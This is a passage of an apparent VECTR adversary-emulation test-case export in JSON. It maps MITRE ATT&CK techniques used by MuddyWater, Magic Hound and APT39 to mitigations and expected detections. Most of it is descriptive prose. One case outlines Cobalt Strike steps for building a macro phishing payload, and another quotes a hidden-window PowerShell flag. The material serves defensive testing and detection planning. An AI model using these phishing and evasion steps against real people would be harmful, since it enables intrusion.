encryption."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c3eaa505-9863-4542-bb38-6bd92f5b1a10","vectrId":"c3eaa505-9863-4542-bb38-6bd92f5b1a10","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"c3eaa505-9863-4542-bb38-6bd92f5b1a10","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Data Compressed","variant":"MuddyWater - Data Compressed","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.Network intrusion prevention or data loss prevention tools may be set to block specific file types from leaving the network over unencrypted channels. An adversary may move to an encrypted channel or use other mechanisms of encapsulating the traffic in these situations.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4","relationship--8cecace8-2820-4489-b3e8-baf4b9f33ff3","relationship--36a41a30-61ce-4c55-9916-0a572dfe6d36","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--ea46cbd0-7134-4ede-a117-47380ddd9b5c","course-of-action--28adf6fd-ab6c-4553-9aa7-cef18a191f33","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016. https://en.wikipedia.org/wiki/List_of_file_signatures"],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c493ba52-17e0-415a-aeed-398cff10c19f","vectrId":"c493ba52-17e0-415a-aeed-398cff10c19f","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"c493ba52-17e0-415a-aeed-398cff10c19f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Security Software Discovery","variant":"MuddyWater - Security Software Discovery","objective":"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n\n### Windows\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n### Mac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7","relationship--6bed87bb-2cb9-48a8-a23d-31ed8285c61f","relationship--c0b07b4a-d421-4faa-8564-4cc89668afac","course-of-action--bd2554b8-634f-4434-a986-9b49c29da2ae","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/"],"mitreId":"T1063"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c5570c4c-4845-478c-8dbf-456690d3faa7","vectrId":"c5570c4c-4845-478c-8dbf-456690d3faa7","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"c5570c4c-4845-478c-8dbf-456690d3faa7","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scripting","variant":"Magic Hound - Scripting - Pupy","objective":"Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has used .vbs scripts for execution.Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. Other types of virtualization and application microsegmentation may also mitigate the impact of compromise.\n---\nTurn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.\n---\n[Pupy](https://attack.mitre.org/software/S0192) can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44","relationship--675f24e0-c445-4eb3-a191-16fb181f6e30","relationship--11767ed3-e938-4d0f-97dd-2a190e55f8db","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--ef3d56d7-2339-4ee7-9086-293d04230fd4","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--edbef2c6-4005-4fdb-b978-9699a7b2a309","course-of-action--57019a80-8523-46b6-be7d-f763a15a2cc6","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--befbbf7a-6480-4825-b7f6-1561dc6d4189","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014. https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/","Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018. https://www.uperesia.com/analyzing-malicious-office-documents","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Metasploit. (n.d.). Retrieved December 4, 2014. http://www.metasploit.com","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Veil Framework. (n.d.). Retrieved December 4, 2014. https://www.veil-framework.com/framework/"],"mitreId":"T1064"},"blueTeam":{"successfulDetectionBehaviors":["Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.\n\nConfigure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. (Citation: Microsoft Block Office Macros) Other types of virtualization and application microsegmentation may also mitigate the impact of compromise. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c5735226-a0fc-4158-8f5b-aa6956749cd5","vectrId":"c5735226-a0fc-4158-8f5b-aa6956749cd5","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","templateId":"c5735226-a0fc-4158-8f5b-aa6956749cd5","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Hidden Window","variant":"Magic Hound - Hidden Window","objective":"Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\n### Windows\nThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)\n\n### Mac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)\n","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.Limit or restrict program execution using anti-virus software. On MacOS, whitelist programs that are allowed to have the plist tag. All other programs should be considered suspicious.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf","relationship--e60f4fce-425c-45f5-a6f3-ee6c3f808fb9","relationship--edb697fa-d6b2-400a-acad-ccacc38c87c0","course-of-action--fae44eea-caa7-42b7-a2e2-0c815ba81b9a","relationship--a80b33dc-0fe2-4b0d-a815-51a036fa410f","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017. https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/","Wheeler, S. et al.. (2019, May 1). About PowerShell.exe. Retrieved October 11, 2019. https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Core/About/about_PowerShell_exe?view=powershell-5.1"],"mitreId":"T1143"},"blueTeam":{"successfulDetectionBehaviors":["Whitelist programs that are allowed to have this plist tag. All other programs should be considered suspicious.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c7d3193f-2f3a-47bf-83b7-e858ba879036","vectrId":"c7d3193f-2f3a-47bf-83b7-e858ba879036","name":"","offset":0,"createTime":1.578425374164E12,"updateTime":1.578425374164E12,"phaseId":"b01606fb-b984-4415-ac33-456e12fecea9","templateId":"c7d3193f-2f3a-47bf-83b7-e858ba879036","icon":"icons/fishing.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Phishing Payload","variant":"Cobalt Strike Standard Macro - Link","objective":"Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.","command":"Attacks --> Packages --> MS Office Macro\nCopy code to office document","likelihood":"Low","risk":"Low","internalExternal":"External","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1192"},"blueTeam":{"successfulDetectionBehaviors":["1) Malicious document blocked/quarantined by email gateway, or email delivered but filtered to junk folder.  Malicious URLs are rewritten and behavior analyzed in sandbox consistent with attachments."],"expectedDetectionLayerIds":["0eaac669-7d11-4397-8011-a9cce6e577be"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten)"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c7e8d98a-fadb-4eb9-a375-99320e49f839","vectrId":"c7e8d98a-fadb-4eb9-a375-99320e49f839","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"c7e8d98a-fadb-4eb9-a375-99320e49f839","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Command-Line Interface","variant":"Magic Hound - Command-Line Interface","objective":"Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) has used the command-line interface.Audit and/or block unnecessary command-line interpreters by using application whitelisting tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830","relationship--17bc0957-1509-4faf-bb51-a6a9e1959978","relationship--87fd0088-41da-47ac-bd69-a8ac151a0d39","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--b1ee5cba-d4e0-4af0-aa5c-5faacfdb0dbc","course-of-action--f28a20fd-d173-4603-807e-2cb3f51bdf04","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Gorzelany, A., Hall, J., Poggemeyer, L.. (2019, January 7). Windows Defender Application Control. Retrieved July 16, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html","Wikipedia. (2016, June 26). Command-line interface. Retrieved June 27, 2016. https://en.wikipedia.org/wiki/Command-line_interface"],"mitreId":"T1059"},"blueTeam":{"successfulDetectionBehaviors":["Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Audit and/or block command-line interpreters by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--c956f7f1-246d-42fe-a455-edb15664590a","vectrId":"c956f7f1-246d-42fe-a455-edb15664590a","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"c956f7f1-246d-42fe-a455-edb15664590a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"User Execution","variant":"MuddyWater - User Execution","objective":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.\n---\nApplication whitelisting may be able to prevent the running of executables masquerading as other files.\n---\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.\n---\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5","relationship--d06420fb-1c4d-4a4e-b18e-4c0750310606","relationship--1d1525e6-74f2-447d-ba11-9e9c9c552403","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--225ab1b4-f800-4a92-9949-a0f05fce6213","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--8e567361-e2de-4dc6-b953-ec82dc143f58","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--66551074-a1e3-439c-a996-c1f7ca8136e2","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--29be2366-5ffb-4499-9984-525f76525326","course-of-action--548bf7ad-e19c-4d74-84bf-84ac4e57f505","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Adamitis, D. et al. (2019, May 20). Recent MuddyWater-associated BlackWater campaign shows signs of new anti-detection techniques. Retrieved June 5, 2019. https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html","Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html","Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/","Lancaster, T.. (2017, November 14). Muddying the Water: Targeted Attacks in the Middle East. Retrieved March 15, 2018. https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/","Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times","PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf","Singh, S. et al.. (2018, March 13). Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign. Retrieved April 11, 2018. https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.\n\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--cce40ed8-2905-4ece-99b4-71986c6595f3","vectrId":"cce40ed8-2905-4ece-99b4-71986c6595f3","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"866d6b69-3f03-4c88-bf51-679a0e4cab74","templateId":"cce40ed8-2905-4ece-99b4-71986c6595f3","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Remote Desktop Protocol","variant":"APT39 - Remote Desktop Protocol","objective":"Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in 